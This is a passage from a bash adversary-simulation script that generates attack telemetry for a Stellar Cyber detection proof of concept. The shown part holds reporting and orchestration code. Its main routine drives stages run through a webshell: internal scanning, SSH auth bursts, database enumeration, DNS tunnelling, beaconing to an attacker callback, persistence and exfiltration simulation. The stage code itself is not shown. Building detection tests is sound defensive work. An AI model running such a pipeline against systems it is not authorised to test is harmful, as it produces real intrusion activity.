        log_cycle_start
        run_selected_pipeline_once || pipeline_stop_requested && break
        TOTAL_CYCLES_COMPLETED="${CURRENT_CYCLE}"
        now=$(date +%s)
        if (( now >= end_epoch )); then
            break
        fi
        sleep_between_pipeline_cycles || break
    done
}

run_pipeline_cycles() {
    if [[ "${DRY_RUN}" == true ]]; then
        if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] \
            || [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
            print_repeat_execution_plan
        fi
        return 0
    fi

    if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
        log_message "OK" "Starting repeat-count mode: ${REPEAT_COUNT} pipeline cycle(s)"
        run_pipeline_repeat_count_mode
        return 0
    fi
    if [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
        log_message "OK" "Starting duration mode: ${DURATION_MINUTES} minute(s)"
        run_pipeline_duration_mode
        return 0
    fi

    CURRENT_CYCLE=1
    log_cycle_start
    run_selected_pipeline_once
    TOTAL_CYCLES_COMPLETED=1
}

append_detection_matrix() {
    [[ -n "${REPORT_MD}" ]] || return 0
    if ! cat <<EOF >> "${REPORT_MD}" 2>/dev/null
## Expected / Likely Detections

| Stage | Expected / Likely Stellar Detection |
|---|---|
| Host Discovery | Discovery Activity / Suspicious Enumeration / Host Reconnaissance |
| Network Discovery | Internal IP Scan |
| Service Discovery | Internal Port Scan |
| SSH Follow-up | Failed SSH Login / Brute-force-like Activity / Lateral Movement-like Traffic |
| Redis Follow-up | Redis Recon / Service Enumeration |
| Elastic Follow-up | Elasticsearch Enumeration / HTTP Recon |
| Mongo Follow-up | MongoDB Enumeration |
| HTTP/HTTPS Follow-up | HTTP Recon / HTTPS Recon / Web Exploit Recon |
| DNS Tunnel | DNS Tunnel |
| Beaconing | Beaconing |
| Windows Telemetry | SMB Recon / RPC Enumeration / AD Discovery / Kerberos Activity |
| Process Chain | Abnormal Parent Child / Suspicious Process Chain |
| Exfil Simulation | Exfiltration |

Depends on:
- sensor visibility
- traffic mirroring
- baseline duration
- EDR process telemetry
- DNS visibility
EOF
    then
        log_message "WARN" "Could not append detection matrix to ${REPORT_MD}"
    fi
}

append_stage_execution_summary() {
    [[ -n "${REPORT_MD}" ]] || return 0
    {
        echo ""
        echo "## Stage Execution Summary"
        echo ""
        echo "### Stage Results"
        read_state_file_or_none "stage_results.log" | sed 's/^/- /'
        echo ""
        echo "### Executed Stages"
        read_state_file_or_none "executed_stages.log" | sed 's/^/- /'
        echo ""
        echo "### Skipped Stages"
        read_state_file_or_none "skipped_stages.log" | sed 's/^/- /'
        echo ""
        echo "### Fallback Usage"
        read_state_file_or_none "fallback_usage.log" | sed 's/^/- /'
        echo ""
        echo "### Dependency Status"
        read_state_file_or_none "dependency_status.log" | sed 's/^/- /'
        echo ""
        echo "### Preflight Results"
        read_state_file_or_none "preflight_results.log" | sed 's/^/- /'
        echo ""
        echo "### Detected Dependencies"
        format_dependency_matrix | sed 's/^/- /'
    } >> "${REPORT_MD}" 2>/dev/null || log_message "WARN" "Could not append stage summary to ${REPORT_MD}"
}

generate_customer_summary() {
    [[ -n "${CUSTOMER_SUMMARY_TXT}" ]] || return 0
    safe_write_file "${CUSTOMER_SUMMARY_TXT}" "$(cat <<EOF
Stellar Cyber PoC Customer Summary
==================================
Campaign ID: ${CAMPAIGN_ID}
Mode/Profile: ${MODE}/${PROFILE}
Target Network: ${TARGET_NET}
Remote Runtime Dir: ${REMOTE_RUNTIME_DIR}
Runtime Mode: ${RUNTIME_MODE}
Runtime Ephemeral: ${RUNTIME_EPHEMERAL}
Runtime Cleanup On Exit: ${CLEANUP_RUNTIME_ON_EXIT}
Runtime Fallback Used: ${RUNTIME_FALLBACK_USED}
Runtime Ownership Issue: ${RUNTIME_OWNERSHIP_ISSUE}
Report Dir: ${EFFECTIVE_REPORT_DIR}
Report Preserved: ${REPORT_PRESERVED}
Report Copy Performed: ${REPORT_COPY_PERFORMED}

$(format_path_isolation_block)

Expected / Likely Detections:
- Internal IP Scan
- Internal Port Scan
- Failed SSH Login / Brute-force-like Activity
- Redis / Elasticsearch / MongoDB Enumeration
- HTTP Recon / HTTPS Recon / Web Exploit Recon
- DNS Tunnel
- Beaconing
- SMB Recon / RPC Enumeration / AD Discovery
- Abnormal Parent Child / Suspicious Process Chain
- Exfiltration

Recommended Stellar Searches:
- campaign_id: ${CAMPAIGN_ID}
- source_ip: ${ATTACKER_IP}
- target_net: ${TARGET_NET}
- DNS Tunnel
- Internal Scan
- Beaconing
- SMB Recon

Dependency Impact:
$(read_state_file_or_none "fallback_usage.log" | sed 's/^/- /')

Stage Results (Success|Partial|Fallback|Skipped|Failed):
$(read_state_file_or_none "stage_results.log" | sed 's/^/- /')

$(format_dependency_matrix)
EOF
)" || log_message "WARN" "Could not write ${CUSTOMER_SUMMARY_TXT}"
}

print_dry_run_plan() {
    cat <<EOF
[DRY-RUN PLAN]
- Intensity: ${POC_INTENSITY} | Duration: ${DURATION_MINUTES} minutes (independent controls)
- Pipeline: ${MODE} | Persistent beacon: ${PERSISTENT_BEACON} | Overlap: ${PIPELINE_OVERLAP}
- Attacker callback: ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
- Per-host targets: HTTP=${HTTP_FOLLOWUP_REQUESTS} SSH auth=${SSH_BURST_ATTEMPTS} SMB=${SMB_PROBE_TARGET} DNS total=${DNS_BURST_COUNT}
- Expected detections: internal scan, HTTP anomaly, SSH auth failures (auth.log), DNS entropy, SMB recon, beaconing, correlation cases
- Fallback: /dev/tcp service classification when nmap absent
- Note: dry-run does not execute remote webshell commands
EOF
    if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] \
        || [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
        print_repeat_execution_plan
    fi
    print_humanize_dry_run_plan
    print_followup_dry_run_plan
}

generate_dry_run_reports() {
    safe_write_file "${REPORT_MD}" "$(cat <<EOF
# Attack Chain Report (Dry-Run)

SIMULATED EXECUTION PLAN

Mode/Profile: ${MODE}/${PROFILE}
Webshell Method: ${WEBSHELL_METHOD}
Auto Overlap: ${AUTO_OVERLAP}
Overlap execution: $(overlap_plan_description)
Remote Runtime Dir: ${REMOTE_RUNTIME_DIR}
Runtime Mode: ${RUNTIME_MODE}
Runtime Ephemeral: ${RUNTIME_EPHEMERAL}
Runtime Cleanup On Exit: ${CLEANUP_RUNTIME_ON_EXIT}
Runtime Fallback Used: ${RUNTIME_FALLBACK_USED}
Runtime Ownership Issue: ${RUNTIME_OWNERSHIP_ISSUE}
Report Dir: ${EFFECTIVE_REPORT_DIR}
Report Preserved: ${REPORT_PRESERVED}
Report Copy Performed: ${REPORT_COPY_PERFORMED}
Keep Artifacts: ${KEEP_ARTIFACTS}

$(format_path_isolation_block)

## Expected / Likely Detections
- Internal Scan
- SSH/Redis/Elastic/Mongo Enumeration
- HTTP/HTTPS Recon
- DNS Tunnel
- Beaconing
- Windows Telemetry
- Exfiltration

## Simulated Targets
- ssh: 10.10.10.10, 10.10.10.20
- http: 10.10.10.30, 10.10.10.40
- https: 10.10.10.50
- smb: 10.10.10.60
- redis: 10.10.10.80
- elastic: 10.10.10.90
- mongo: 10.10.10.100

## Stage Results (Simulated)
$(read_state_file_or_none "stage_results.log" | sed 's/^/- /')

## Fallback Plan
$(read_state_file_or_none "fallback_usage.log" | sed 's/^/- /')
EOF
)" || log_message "WARN" "Could not write ${REPORT_MD}"
    safe_write_file "${SUMMARY_TXT}" "$(cat <<EOF
SIMULATED EXECUTION PLAN
$(format_capability_matrix)

Campaign ID: ${CAMPAIGN_ID}
Mode/Profile: ${MODE}/${PROFILE}
Webshell: ${WEB_SHELL_URL}
Webshell Method: ${WEBSHELL_METHOD}
Target Net: ${TARGET_NET}
Overlap Planned: ${AUTO_OVERLAP}
Overlap execution: $(overlap_plan_description)
Remote Runtime Dir: ${REMOTE_RUNTIME_DIR}
Runtime Mode: ${RUNTIME_MODE}
Runtime Ephemeral: ${RUNTIME_EPHEMERAL}
Runtime Cleanup On Exit: ${CLEANUP_RUNTIME_ON_EXIT}
Runtime Fallback Used: ${RUNTIME_FALLBACK_USED}
Runtime Ownership Issue: ${RUNTIME_OWNERSHIP_ISSUE}
Report Dir: ${EFFECTIVE_REPORT_DIR}
Report Preserved: ${REPORT_PRESERVED}
Report Copy Performed: ${REPORT_COPY_PERFORMED}
Fallback Planned: yes (dependency unknown in dry-run; parallel /dev/tcp scan when nmap absent)

$(format_path_isolation_block)

Simulated Targets:
- ssh: 10.10.10.10, 10.10.10.20
- http: 10.10.10.30, 10.10.10.40
- https: 10.10.10.50
- redis: 10.10.10.80
- elastic: 10.10.10.90
- mongo: 10.10.10.100

Stage Results:
$(read_state_file_or_none "stage_results.log" | sed 's/^/- /')
EOF
)" || log_message "WARN" "Could not write ${SUMMARY_TXT}"
    safe_write_file "${CUSTOMER_SUMMARY_TXT}" "$(cat <<EOF
Stellar Cyber PoC Customer Summary (Dry-Run)
SIMULATED EXECUTION PLAN

Expected / Likely Detections:
- Internal Scan
- SSH/Redis/Elastic/Mongo Enumeration
- HTTP/HTTPS Recon
- DNS Tunnel
- Beaconing
- SMB Recon / RPC Enumeration / AD Discovery
- Exfiltration
EOF
)" || log_message "WARN" "Could not write ${CUSTOMER_SUMMARY_TXT}"
}

compile_summary_report() {
    local beacon_total exfil_total beacon_attempt beacon_success exfil_attempt exfil_success
    beacon_total=$(sum_beacon_count)
    exfil_total=$(sum_exfil_count)
    beacon_attempt=$(sum_state_counter "beacon_attempt_count.log")
    beacon_success=$(sum_state_counter "beacon_success_count.log")
    exfil_attempt=$(sum_state_counter "exfil_attempt_count.log")
    exfil_success=$(sum_state_counter "exfil_success_count.log")
    if [[ "${DRY_RUN}" == true ]]; then
        simulate_dry_run_followup_counts
        print_dry_run_plan
        generate_dry_run_reports
        append_followup_report_sections
        return 0
    fi
    append_detection_matrix
    append_stage_execution_summary
    generate_customer_summary
    safe_write_file "${SUMMARY_TXT}" "$(cat <<EOF
==============================================================================
Stellar Cyber PoC Telemetry Summary
==============================================================================
$(format_capability_matrix)

Campaign ID            : ${CAMPAIGN_ID}
Mode / Profile         : ${MODE} / ${PROFILE}
Webshell               : ${WEB_SHELL_URL}
Webshell Method        : ${WEBSHELL_METHOD}
Attacker Callback Base : ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
Attacker Port          : ${ATTACKER_PORT}
Target Network         : ${TARGET_NET}
Pipeline Schedule      : $(pipeline_schedule_description)
Repeat Count           : $( [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] && printf '%s' "${REPEAT_COUNT}" || printf 'single-run' )
Duration Minutes       : $( [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]] && printf '%s' "${DURATION_MINUTES}" || printf 'n/a' )
Cycle Sleep (seconds)  : ${PIPELINE_CYCLE_SLEEP}
Total Cycles Completed : ${TOTAL_CYCLES_COMPLETED}
Auto Overlap           : ${AUTO_OVERLAP}
Overlap execution      : $(overlap_plan_description)
Remote Runtime Dir     : ${REMOTE_RUNTIME_DIR}
Runtime Mode           : ${RUNTIME_MODE}
Runtime Ephemeral      : ${RUNTIME_EPHEMERAL}
Runtime Cleanup On Exit: ${CLEANUP_RUNTIME_ON_EXIT}
Runtime Fallback Used  : ${RUNTIME_FALLBACK_USED}
Runtime Ownership Issue: ${RUNTIME_OWNERSHIP_ISSUE}
Report Dir             : ${EFFECTIVE_REPORT_DIR}
Report Preserved       : ${REPORT_PRESERVED}
Report Copy Performed  : ${REPORT_COPY_PERFORMED}
Artifacts Preserved    : ${KEEP_ARTIFACTS}

$(format_path_isolation_block)

Telemetry counters
- Beacon callback count : ${beacon_total}
- Beacon attempts       : ${beacon_attempt}
- Beacon successes      : ${beacon_success}
- Exfil attempts        : ${exfil_attempt}
- Exfil successes       : ${exfil_success}
- Exfil callback count  : ${exfil_total}

Stage Results
$(read_state_file_or_none "stage_results.log" | sed 's/^/- /')

Dependency Impact
$(read_state_file_or_none "fallback_usage.log" | sed 's/^/- /')

$(format_dependency_matrix)

Human-Like Operator Metrics
- Attacker Behavior Score    : $(humanize_behavior_score)
- Detection Density Score    : $(humanize_detection_density_score)
- Timeline Complexity Score  : $(humanize_timeline_complexity_score)
- Persistent Beacon          : ${PERSISTENT_BEACON} (interval=${BEACON_INTERVAL_SEC}s jitter=${JITTER_PERCENT}%)
- Pipeline Overlap           : ${PIPELINE_OVERLAP} (max=${MAX_OVERLAP})
- Timing Profile             : ${TIMING_PROFILE}
- Noise Level                : ${NOISE_LEVEL}
- Warmup Minutes               : ${WARMUP_MINUTES}
- Burst Mode                 : ${BURST_MODE} (events=${BURST_EVENTS})
- Slow HTTP                  : ${SLOW_HTTP} (${SLOW_HTTP_SECONDS}s)
- Beacon HTTP/DNS (background): ${HUMANIZE_BEACON_HTTP_COUNT}/${HUMANIZE_BEACON_DNS_COUNT}

Service Follow-up Telemetry
- Intensity                     : ${POC_INTENSITY}
- Duration (minutes)            : ${DURATION_MINUTES}
- Services discovered           : ${SERVICES_DISCOVERED_TOTAL}
- Services usable (validated)   : ${SERVICES_USABLE_TOTAL:-0}
- Follow-up actions total       : ${FOLLOWUP_ACTIONS_TOTAL}
- HTTP planned / attempted / connected : ${HTTP_REQUESTS_PLANNED:-0} / ${HTTP_FOLLOWUP_ATTEMPTED:-0} / ${HTTP_FOLLOWUP_CONNECTED:-0}
- HTTP requests (counter)       : ${FOLLOWUP_HTTP_REQUESTS}
- SSH planned / attempted / auth failures observed : ${SSH_ATTEMPTS_PLANNED:-0} / ${SSH_AUTH_ATTEMPTED:-0} / ${SSH_AUTH_FAILURES_OBSERVED:-0}
- SSH auth failures (counter)   : ${FOLLOWUP_SSH_AUTH_FAILURES} (executed ${SSH_ATTEMPTS_EXECUTED})
- SMB planned / attempted / connected : ${SMB_PROBES_PLANNED:-0} / ${SMB_PROBES_ATTEMPTED:-0} / ${SMB_PROBES_CONNECTED:-0}
- SMB probe count (counter)     : ${FOLLOWUP_SMB_PROBES}
- DNS planned / attempted       : ${DNS_BURST_COUNT:-0} / ${DNS_QUERIES_ATTEMPTED:-0}
- DNS query count (counter)     : ${FOLLOWUP_DNS_QUERIES}
- Persistent beacon enabled     : ${PERSISTENT_BEACON}
- Overlap enabled               : ${PIPELINE_OVERLAP}
- SCAN-ONLY FAILURE             : ${SCAN_ONLY_WARNING}
- Follow-up validation failed   : ${FOLLOWUP_VALIDATION_FAILED}
- ML spike indicators           : high-volume HTTP/SSH/DNS/SMB bursts + overlap timeline + beacon persistence
==============================================================================
EOF
)" || log_message "WARN" "Could not write ${SUMMARY_TXT}"
    append_followup_report_sections
    append_humanize_report_sections
    if [[ -f "${SUMMARY_TXT}" ]]; then
        cat "${SUMMARY_TXT}"
    fi
}

render_banner() {
    printf '%b' "$(cat <<EOF
${CYAN}${BOLD}==============================================================================
Stellar Cyber PoC Telemetry Generator (Safe Mode)
Bundle Version  : ${STELLAR_POC_VERSION}
==============================================================================${NC}
Webshell        : ${WEB_SHELL_URL}
Attacker        : ${ATTACKER_BASE_URL}
Target Net      : ${TARGET_NET}
Intensity       : ${POC_INTENSITY} (HTTP ${HTTP_FOLLOWUP_REQUESTS}/host, SSH ${SSH_BURST_ATTEMPTS}/host, DNS ${DNS_BURST_COUNT}, SMB ${SMB_PROBE_TARGET}/host)
Duration        : ${DURATION_MINUTES} minute(s) | Schedule: $(pipeline_schedule_description)
Persistent Beacon: ${PERSISTENT_BEACON} | Overlap: ${PIPELINE_OVERLAP} | Burst: ${BURST_MODE}
Remote Runtime  : ${REMOTE_RUNTIME_DIR}
Local Report    : ${EFFECTIVE_REPORT_DIR}
Dry Run         : ${DRY_RUN}
EOF
)"
    echo ""
    if [[ "${RUNTIME_FALLBACK_USED}" == true ]]; then
        log_message "WARN" "Remote runtime fallback is active — verify REMOTE_RUNTIME_DIR matches the webshell host user (e.g. /tmp/.poc_runtime_www-data)."
    fi
}

print_next_steps() {
    cat <<EOF
Next Steps in Stellar:
1. Search Campaign ID: ${CAMPAIGN_ID}
2. Check Internal Scan alerts
3. Check Beaconing detections
4. Check DNS Tunnel detections
5. Check Correlated Cases
EOF
}

validate_report_artifacts() {
    local ok=true
    if [[ -n "${REPORT_MD}" && ! -f "${REPORT_MD}" ]]; then
        log_message "WARN" "Report file missing: ${REPORT_MD}"
        ok=false
    fi
    if [[ -n "${SUMMARY_TXT}" && ! -f "${SUMMARY_TXT}" ]]; then
        log_message "WARN" "Summary file missing: ${SUMMARY_TXT}"
        ok=false
    fi
    if [[ -n "${CUSTOMER_SUMMARY_TXT}" && ! -f "${CUSTOMER_SUMMARY_TXT}" ]]; then
        log_message "WARN" "Customer summary missing: ${CUSTOMER_SUMMARY_TXT}"
        ok=false
    fi
    if [[ -n "${LOG_FILE}" && ! -f "${LOG_FILE}" ]]; then
        log_message "WARN" "Operator log missing: ${LOG_FILE}"
        ok=false
    fi
    if [[ -n "${TIMELINE_LOG}" && ! -f "${TIMELINE_LOG}" ]]; then
        log_message "WARN" "Timeline log missing: ${TIMELINE_LOG}"
        ok=false
    fi
    [[ "${ok}" == true ]]
}

print_artifacts() {
    local report_status="missing" log_status="missing" timeline_status="missing" customer_status="missing"
    [[ -f "${REPORT_MD}" ]] && report_status="present"
    [[ -d "${LOG_DIR}" ]] && log_status="present"
    [[ -f "${TIMELINE_LOG}" ]] && timeline_status="present"
    [[ -f "${CUSTOMER_SUMMARY_TXT}" ]] && customer_status="present"
    cat <<EOF
Artifacts (report preserved=${REPORT_PRESERVED}, copy=${REPORT_COPY_PERFORMED}):
- report path: ${REPORT_MD} [${report_status}]
- logs path: ${LOG_DIR} [${log_status}]
- timeline path: ${TIMELINE_LOG} [${timeline_status}]
- customer summary path: ${CUSTOMER_SUMMARY_TXT} [${customer_status}]
- summary path: ${SUMMARY_TXT}
- remote runtime path (ephemeral=${RUNTIME_EPHEMERAL}): ${REMOTE_RUNTIME_DIR}
- local state path: ${LOCAL_STATE_DIR}
EOF
}

audit_remote_payload_isolation() {
  local script_path="$0"
  local hits
  hits=$(safe_int "$(grep -nE 'run_webshell(_raw)?|run_remote_python' "${script_path}" 2>/dev/null | safe_count_lines)")
  vlog "Remote invocation sites in script: ${hits}"
  if grep -qE "run_webshell.*\$\{(LOG_DIR|EFFECTIVE_REPORT_DIR|REPORT_MD|LOCAL_STATE_DIR|TIMELINE_LOG)" "${script_path}" 2>/dev/null; then
    log_message "ERROR" "Isolation audit failed: local path variable referenced in webshell call"
    return 1
  fi
  return 0
}

main() {
    trap cleanup_background_jobs EXIT
    trap on_pipeline_signal INT TERM
    trap on_pipeline_err ERR
    if [[ $# -eq 0 ]]; then
        show_usage_menu
        exit 0
    fi
    parse_cli_switches "$@"
    validate_inputs
    apply_user_intensity_profile
    apply_cli_telemetry_overrides
    resolve_runtime_dir
    if [[ "${KEEP_ARTIFACTS}" == true ]]; then
        CLEANUP_RUNTIME_ON_EXIT=false
    fi
    setup_environment
    audit_remote_payload_isolation || true
    assess_local_capabilities
    render_banner
    stage_runtime_validation

    # Preflight sequence:
    # 1) local validation (already done)
    # 2) webshell reachable
    # 3) command execution validation
    # 4) runtime writable
    stage_preflight_validation
    # 5) dependency assessment
    assess_remote_capabilities
    # 6) callback reachability / 7) DNS validation
    stage_post_assessment_validations

    stage_warmup_phase
    start_humanize_services

    if [[ -n "${SINGLE_STAGE}" ]]; then
        case "${SINGLE_STAGE}" in
            foothold) stage_initial_foothold ;;
            preflight_validation) stage_preflight_validation ;;
            runtime_validation) stage_runtime_validation ;;
            host_discovery) stage_host_discovery ;;
            network_discovery) stage_network_discovery ;;
            service_discovery) stage_service_discovery ;;
            tcp_fanout) stage_tcp_fanout ;;
            ssh_followup) stage_ssh_followup ;;
            redis_followup) stage_redis_followup ;;
            elastic_followup) stage_elastic_followup ;;
            mongo_followup) stage_mongo_followup ;;
            http_followup) stage_http_followup ;;
            windows_telemetry) stage_windows_telemetry ;;
            dns_tunnel) stage_dns_tunnel_simulation ;;
            beaconing) stage_beaconing ;;
            process_chain) stage_realistic_process_chains ;;
            persistence_simulation) stage_persistence_simulation ;;
            exfiltration) stage_exfil_simulation ;;
            cleanup) stage_cleanup_simulation ;;
            adaptive_operator) stage_adaptive_operator_followup ;;
            warmup) stage_warmup_phase ;;
            burst) stage_burst_activity ;;
            ssh_auth_burst) stage_ssh_auth_burst ;;
            followup_validation) stage_followup_validation ;;
            *) log_message "ERROR" "Unknown --single-stage: ${SINGLE_STAGE}"; exit 1 ;;
        esac
        compile_summary_report
        validate_report_artifacts || true
        print_next_steps
        print_artifacts
        exit 0
    fi

    run_pipeline_cycles

    stop_all_humanize_workers 2>/dev/null || true
    run_stage_safe "Cleanup Simulation" stage_cleanup_simulation
    compile_summary_report
    validate_report_artifacts || true
    print_next_steps
    print_artifacts
    if [[ "${FOLLOWUP_VALIDATION_FAILED}" == true ]]; then
        log_message "ERROR" "PoC completed with SCAN-ONLY / follow-up validation FAILURE — see summary and ${EFFECTIVE_REPORT_DIR}"
        exit 2
    fi
    log_message "OK" "PoC simulation completed"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
